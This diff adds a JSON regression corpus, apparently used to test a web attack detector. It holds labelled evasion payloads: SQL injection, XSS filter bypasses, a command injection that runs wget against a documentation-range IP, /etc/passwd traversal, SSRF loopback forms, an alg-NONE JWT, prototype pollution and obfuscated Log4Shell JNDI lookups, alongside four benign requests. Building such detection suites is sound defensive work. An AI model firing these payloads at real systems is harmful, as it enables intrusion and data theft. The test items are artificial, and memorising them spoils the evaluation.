@@ -1,0 +1,172 @@
+{
+  "version": "heldout-v1",
+  "created": "2026-11-01",
+  "provenance": {
+    "description": "Second batch of payloads, written after the first regression pass to check whether the fixes generalise. Cases are variants, not copies of independent_v1 cases.",
+    "sources": [
+      "OWASP WSTG / CRS bypass notes",
+      "PortSwigger XSS filter-evasion notes",
+      "Log4Shell obfuscation catalogues",
+      "Benign content from CDN/font usage and GraphQL mutations"
+    ],
+    "status": "First run: 11/17 attacks detected, 0/4 benign blocked. After correction it is a regression suite and no longer a held-out estimate. See corpus/README.md.",
+    "measured_baseline": "See corpus/README.md for the first-run misses."
+  },
+  "cases": [
+    {
+      "id": "sqli-numeric-comparison",
+      "category": "sql_injection",
+      "label": "malicious",
+      "note": "Constant comparison that is always true (2 > 1).",
+      "request": { "method": "GET", "path": "/items", "query": "id=1 OR 2>1", "body": "" }
+    },
+    {
+      "id": "sqli-or-short-comment",
+      "category": "sql_injection",
+      "label": "malicious",
+      "note": "OR with a numeric literal and comment truncation.",
+      "request": { "method": "GET", "path": "/items", "query": "id=1' OR 1--", "body": "" }
+    },
+    {
+      "id": "xss-nested-script",
+      "category": "xss",
+      "label": "malicious",
+      "note": "Nested tag breaks naive <script> detection.",
+      "request": { "method": "POST", "path": "/comment", "query": "", "body": "<scr<script>ipt>alert(1)</script>" }
+    },
+    {
+      "id": "xss-slash-event",
+      "category": "xss",
+      "label": "malicious",
+      "note": "Slash-separated attributes instead of spaces.",
+      "request": { "method": "POST", "path": "/comment", "query": "", "body": "<img/src=x/onerror=alert(1)>" }
+    },
+    {
+      "id": "xss-svg-slash",
+      "category": "xss",
+      "label": "malicious",
+      "note": "Slash-separated SVG onload.",
+      "request": { "method": "POST", "path": "/comment", "query": "", "body": "<svg/onload=alert(1)>" }
+    },
+    {
+      "id": "xss-named-entity",
+      "category": "xss",
+      "label": "malicious",
+      "note": "Named HTML entity for the scheme colon.",
+      "request": { "method": "POST", "path": "/comment", "query": "", "body": "<a href=\"javascript&colon;alert(1)\">x</a>" }
+    },
+    {
+      "id": "rce-newline",
+      "category": "command_injection",
+      "label": "malicious",
+      "note": "Percent-encoded newline separator.",
+      "request": { "method": "GET", "path": "/ping", "query": "ip=127.0.0.1%0aid", "body": "" }
+    },
+    {
+      "id": "rce-ifs-wget",
+      "category": "command_injection",
+      "label": "malicious",
+      "note": "${IFS} before a downloader.",
+      "request": { "method": "GET", "path": "/ping", "query": "cmd=;${IFS}wget${IFS}http://198.51.100.9/x", "body": "" }
+    },
+    {
+      "id": "path-double-single",
+      "category": "path_traversal",
+      "label": "malicious",
+      "note": "Single dot segment double encoded.",
+      "request": { "method": "GET", "path": "/download", "query": "file=..%252f..%252fetc%252fpasswd", "body": "" }
+    },
+    {
+      "id": "path-division-slash",
+      "category": "path_traversal",
+      "label": "malicious",
+      "note": "Unicode division slash (U+2215) as a path separator.",
+      "request": { "method": "GET", "path": "/download", "query": "file=..∕..∕..∕etc∕passwd", "body": "" }
+    },
+    {
+      "id": "ssrf-short-loopback",
+      "category": "ssrf",
+      "label": "malicious",
+      "note": "Short-form 127.1 loopback address.",
+      "request": { "method": "GET", "path": "/fetch", "query": "url=http://127.1/", "body": "" }
+    },
+    {
+      "id": "ssrf-ipv6-mapped-hex",
+      "category": "ssrf",
+      "label": "malicious",
+      "note": "IPv4-mapped IPv6 loopback in hex form.",
+      "request": { "method": "GET", "path": "/fetch", "query": "url=http://[::ffff:7f00:1]/", "body": "" }
+    },
+    {
+      "id": "graphql-encoded-introspection",
+      "category": "graphql_abuse",
+      "label": "malicious",
+      "note": "URL-encoded __type introspection in a GET parameter.",
+      "request": { "method": "GET", "path": "/graphql", "query": "query=%7B__type(name%3A%22User%22)%7Bname%7D%7D", "body": "" }
+    },
+    {
+      "id": "jwt-alg-none-uppercase",
+      "category": "jwt_tampering",
+      "label": "malicious",
+      "note": "alg value spelled NONE.",
+      "request": {
+        "method": "GET",
+        "path": "/api/me",
+        "query": "",
+        "body": "",
+        "headers": {
+          "authorization": "Bearer eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
+        }
+      }
+    },
+    {
+      "id": "proto-dot-notation",
+      "category": "prototype_pollution",
+      "label": "malicious",
+      "note": "Dot-notation prototype pollution in query parameters.",
+      "request": { "method": "GET", "path": "/api/users", "query": "__proto__.isAdmin=true", "body": "" }
+    },
+    {
+      "id": "log4j-env-lookup",
+      "category": "framework_exploit_probe",
+      "label": "malicious",
+      "note": "Nested env lookup supplies the 'j' character.",
+      "request": { "method": "POST", "path": "/api/log", "query": "", "body": "{\"msg\":\"${${env:BARFOO:-j}ndi:ldap://198.51.100.9/a}\"}" }
+    },
+    {
+      "id": "log4j-upper-scheme",
+      "category": "framework_exploit_probe",
+      "label": "malicious",
+      "note": "Uppercase scheme assembled with ${upper:}.",
+      "request": { "method": "POST", "path": "/api/log", "query": "", "body": "{\"msg\":\"${jndi:${upper:L}DAP://198.51.100.9/a}\"}" }
+    },
+    {
+      "id": "benign-cdn-script",
+      "category": "benign",
+      "label": "benign",
+      "note": "HTTPS CDN include in CMS content.",
+      "request": { "method": "POST", "path": "/api/v1/content", "query": "", "body": "<script src=\"https://cdn.example.com/app.js\"></script>" }
+    },
+    {
+      "id": "benign-font-data-uri",
+      "category": "benign",
+      "label": "benign",
+      "note": "Base64 WOFF2 data URI.",
+      "request": { "method": "POST", "path": "/api/v1/content", "query": "", "body": "<style>@font-face{src:url(data:font/woff2;base64,AAAA)}</style>" }
+    },
+    {
+      "id": "benign-graphql-mutation",
+      "category": "benign",
+      "label": "benign",
+      "note": "Normal shallow mutation.",
+      "request": { "method": "POST", "path": "/graphql", "query": "", "body": "{\"query\":\"mutation { updateCart(input:{id:1}) { id total } }\"}" }
+    },
+    {
+      "id": "benign-html-entity-prose",
+      "category": "benign",
+      "label": "benign",
+      "note": "Escaped ampersand in user text.",
+      "request": { "method": "POST", "path": "/api/v1/comments", "query": "", "body": "{\"text\":\"Tom &amp; Jerry\"}" }
+    }
+  ]
+}
